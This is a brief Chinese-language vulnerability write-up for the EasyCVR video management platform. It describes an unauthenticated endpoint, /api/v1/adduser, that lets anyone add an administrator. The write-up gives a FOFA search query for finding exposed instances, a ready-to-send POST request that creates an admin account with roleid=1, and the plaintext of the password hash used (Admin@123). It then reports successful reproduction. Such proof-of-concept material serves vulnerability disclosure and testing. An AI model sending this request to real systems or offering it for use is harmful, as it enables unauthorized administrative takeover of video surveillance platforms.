**漏洞名称**

EasyCVR视频管理平台存在任意用户添加漏洞

**漏洞影响**

EasyCVR 视频管理平台 版本不详

**漏洞描述**

EasyCVR 视频管理平台是 TSINGSEE 青犀视频旗下一款软硬一体的产品，可提供多协议的设备接入、采集、AI 智能检测、处理、分发等服务，攻击者可通过/api/v1/adduser接口添加管理员账户

**FOFA搜索语句**

app="EasyCVR-视频管理平台"

**漏洞复现**

```yaml
POST /api/v1/adduser HTTP/1.1
Host: your-ip
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

name=admin888&username=admin888&password=0e7517141fb53f21ee439b355b5a1d0a&roleid=1
```

```
0e7517141fb53f21ee439b355b5a1d0a` 明文为 `Admin@123
```

漏洞复现成功



